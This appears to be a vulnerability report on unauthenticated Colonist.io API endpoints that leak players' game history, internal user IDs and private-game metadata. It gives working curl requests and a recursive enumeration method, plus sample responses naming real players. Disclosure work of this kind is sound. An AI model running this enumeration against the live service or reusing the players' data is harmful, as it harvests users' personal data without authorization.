# Executive Summary

# Unauthenticated Bulk Profile History API Exposes Player and Private-Game Metadata

# Executive Summary

Colonist.io exposes profile game-history data through unauthenticated API endpoints. A requester with no session can recursively enumerate player profiles and retrieve recent game history records for other users. The returned records include internal numeric user IDs, usernames, ranks, points, finish/quit state, device type IDs, game IDs, settings, duration, turn count, and replay availability flags.

The strongest confirmed impact is bulk cross-user access to game and player metadata, including records for games explicitly marked \`privateGame: true\`. In one bounded bulk run, 1,186 unauthenticated profile-history responses exposed 90,397 unique internal player IDs and 105,797 unique game records. A fresh single-profile control confirmed 13 private-game records in one unauthenticated response, 11 of which had \`hasReplay: true\`.

This report does not claim a validated full-replay bulk extraction by numeric game ID. Direct replay-by-gameId remained gated in this run. Payment/premium bypass testing also did not validate a free-premium path, so those branches are excluded from confirmed findings.

# Finding 1 \- 1 Unauthenticated Bulk Profile History

# Finding 1: Unauthenticated Bulk Profile History API Exposes Player and Private-Game Metadata

## Severity

High

## Affected Host

\`https://colonist.io\`

## Affected Endpoints

GET /api/profile/{username}/history  
GET /api/profile/{userId}/username  
GET /api/game-list.json  
GET /api/leaderboards-username-search/{mode}/?usernameSearchInput={query}  
GET /api/leaderboards/{mode}/

## Required Role or Session

No account, cookies, bearer token, or authenticated session is required for the primary history endpoint.

## Confirmed Affected Count

Confirmed during bounded testing:

\- 1,186 successful unauthenticated profile-history responses  
\- 90,397 unique internal player IDs observed  
\- 105,797 unique game records observed  
\- 94,088 observed game records marked \`hasReplay: true\`  
\- 255,443 co-player edges observed  
\- 24,500 additional usernames still queued when testing stopped  
\- 13 private-game records in one fresh unauthenticated profile-history response  
\- 11 private-game records with \`hasReplay: true\` in that same response

The total affected population is unknown. The confirmed reachable set was not exhausted during testing.

## Where It Was Found

The issue was identified by reviewing Colonist.io's public client route references and validating the corresponding API behavior directly. The public client route map references profile-history routes of the form:

/api/profile/{username}/history  
/api/profile/{username}/overview  
/api/profile/{username}/items  
/api/profile/{username}/ranked  
/api/profile/{userId}/username

The profile-history route returned real cross-user game history data without authentication. Public live-game and leaderboard endpoints provided seed usernames that could be recursively expanded through co-player usernames and internal numeric user IDs returned by each history response.

## Reproduction Steps

1\. Send an unauthenticated request for a public profile's history:

curl \-s 'https://colonist.io/api/profile/AKN005/history' \\  
  \-H 'accept: application/json'

2\. Observe that the response returns a profile user ID and an array of game records without requiring authentication.

3\. In the returned \`gameDatas\` array, identify records where \`setting.privateGame\` is \`true\`.

4\. Extract co-player usernames and internal numeric user IDs from \`gameDatas\[\].players\[\]\`.

5\. Use any returned co-player username in another unauthenticated history request:

curl \-s 'https://colonist.io/api/profile/AnuragK/history' \\  
  \-H 'accept: application/json'

6\. Repeat the process to recursively enumerate additional users and game records.

7\. Seed additional usernames from public listing endpoints such as:

curl \-s 'https://colonist.io/api/game-list.json' \\  
  \-H 'accept: application/json'

or leaderboard username-search endpoints.

## Example Request

GET /api/profile/AKN005/history HTTP/2  
Host: colonist.io  
Accept: application/json  
User-Agent: Mozilla/5.0

## Example Response

The following response excerpt is redacted to the fields needed to prove impact. The request was unauthenticated.

{  
  "profileUserId": "100506111",  
  "gameDatas": \[  
    {  
      "id": "231073074",  
      "setting": {  
        "privateGame": true,  
        "maxPlayers": 3,  
        "gameType": 3  
      },  
      "finished": true,  
      "turnCount": 75,  
      "startTime": "1779382034787",  
      "duration": "2220043",  
      "hasReplay": true,  
      "players": \[  
        {  
          "userId": "76283808",  
          "username": "AnuragK",  
          "rank": 1,  
          "points": 19,  
          "finished": true,  
          "deviceTypeId": 4  
        },  
        {  
          "userId": "91860028",  
          "username": "Ceejayy",  
          "rank": 2,  
          "points": 13,  
          "finished": true,  
          "deviceTypeId": 4  
        },  
        {  
          "userId": "100506111",  
          "username": "AKN005",  
          "rank": 3,  
          "points": 9,  
          "finished": true,  
          "deviceTypeId": 4  
        }  
      \]  
    },  
    {  
      "id": "231080837",  
      "setting": {  
        "privateGame": true,  
        "maxPlayers": 5,  
        "gameType": 3  
      },  
      "finished": true,  
      "turnCount": 130,  
      "duration": "5750651",  
      "hasReplay": true,  
      "players": \[  
        {  
          "userId": "76283808",  
          "username": "AnuragK",  
          "rank": 1,  
          "points": 18,  
          "finished": false,  
          "deviceTypeId": 4  
        },  
        {  
          "userId": "54815831",  
          "username": "Thecrazy0ne",  
          "rank": 3,  
          "points": 16,  
          "finished": false,  
          "deviceTypeId": 1  
        },  
        {  
          "userId": "76716404",  
          "username": "PonyoChan",  
          "rank": 5,  
          "points": 3,  
          "finished": false,  
          "deviceTypeId": 4  
        }  
      \]  
    }  
  \]  
}

## Recursive Enumeration Example

A single history response exposes co-player usernames and internal user IDs. Those usernames can be used as new inputs to the same endpoint:

GET /api/profile/AnuragK/history HTTP/2  
Host: colonist.io  
Accept: application/json

The API also exposes a user ID to username resolver:

GET /api/profile/76283808/username HTTP/2  
Host: colonist.io  
Accept: application/json

This makes the exposed identifiers reusable for continued traversal.

## Impact

An unauthenticated attacker can collect large-scale cross-user game history and player graph data from Colonist.io. Confirmed exposed data includes:

\- Internal numeric user IDs  
\- Usernames  
\- Co-player relationships  
\- Game IDs  
\- Game settings  
\- Private-game flags  
\- Replay availability flags  
\- Rank and point results  
\- Finish and quit state  
\- Turn count and duration  
\- Device type IDs

The exposure is not limited to public live games or leaderboards. The positive control returned games explicitly marked \`privateGame: true\`, including co-player identities and game result metadata.

The exposed \`hasReplay: true\` flag also identifies games that have full replay content somewhere in the system, even when direct replay-by-gameId is not accessible to an unauthenticated user.

## Validation Notes

The positive control returned protected data, not a non-401 response with an application-level error. The unauthenticated response contained populated game history records, internal IDs, co-player data, and records marked \`privateGame: true\`.

Pre-publish severity gate answer: Did the positive control return protected data or a confirmed mutation, or just a non-401 / 200-with-app-error response? It returned protected cross-user game-history data and private-game metadata. It was not a 200-with-error response.

Direct replay-by-gameId was tested separately and did not return full replay JSON in this run. That is why this finding is limited to bulk profile-history and game/player metadata exposure, not arbitrary full-replay extraction.

# Plain-English Summary

# Plain-English Summary

1\. Unauthenticated bulk profile history exposure \- Private game metadata exposed without login \- 105,797 game records

# Public Company Context

# Public Company Context

\- Goktug Yilmaz \- Co-founder, Product  
\- Demi Yilmaz \- Co-founder, Hiring & Marketing  
\- Jeff d'Eon \- Game Dev, Backend

Company website: https://colonist.io  
